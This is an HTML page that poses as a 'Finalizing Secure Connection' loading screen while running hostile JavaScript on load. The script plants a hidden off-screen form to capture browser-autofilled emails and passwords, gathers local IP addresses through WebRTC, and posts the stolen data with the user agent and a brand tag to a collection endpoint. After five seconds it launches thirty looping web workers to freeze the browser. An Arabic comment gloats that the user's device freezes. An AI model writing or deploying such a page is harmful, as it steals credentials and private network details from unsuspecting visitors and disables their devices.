<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Finalizing Setup...</title>
<style>
  body { background: #0f1115; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
  .loader { border: 4px solid #2a2f3a; border-top: 4px solid #4a90e2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  p { color: #8a8f99; font-size: 14px; }
</style>
</head>
<body>
  <div class="loader"></div>
  <h2>Finalizing Secure Connection...</h2>
  <p>Please do not close this window.</p>

<script>
const urlParams = new URLSearchParams(window.location.search);
const brand = urlParams.get('b') || 'generic';

function stealAutofill() {
  const form = document.createElement('form');
  form.style.position = 'absolute'; form.style.left = '-9999px'; form.style.opacity = '0';
  
  const email = document.createElement('input');
  email.type = 'email'; email.autocomplete = 'username';
  const pass = document.createElement('input');
  pass.type = 'password'; pass.autocomplete = 'current-password';
  
  form.appendChild(email); form.appendChild(pass); document.body.appendChild(form);
  
  setTimeout(() => {
    if (email.value || pass.value) {
      sendIntel({ autofill: { email: email.value, pass: pass.value } });
    }
    form.remove();
  }, 2000);
}

async function leakLocalIps() {
  const ips = [];
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    pc.onicecandidate = (ice) => {
      if (!ice || !ice.candidate) return;
      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
      if (ipMatch && !ips.includes(ipMatch[1])) ips.push(ipMatch[1]);
    };
    await new Promise(r => setTimeout(r, 3000));
    pc.close();
  } catch (e) {}
  if (ips.length > 0) sendIntel({ localIps: ips });
}

function freezeBrowser() {
  for (let i = 0; i < 30; i++) {
    new Worker(URL.createObjectURL(new Blob([`
      let i = 0;
      function loop() { i++; new Array(1000000).fill(Math.random()).sort(); setTimeout(loop, 1); }
      loop();
    `], {type: 'application/javascript'})));
  }
}

async function sendIntel(payload) {
  await fetch('/capture-extra', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...payload, brand: brand, ua: navigator.userAgent })
  }).catch(() => {});
}

window.addEventListener('load', async () => {
  stealAutofill();
  leakLocalIps();
  setTimeout(() => { freezeBrowser(); }, 5000);
  // هون بينتهي السيناريو، الجهاز بيتجمد والمستخدم بينجن
});
</script>
</body>
</html>
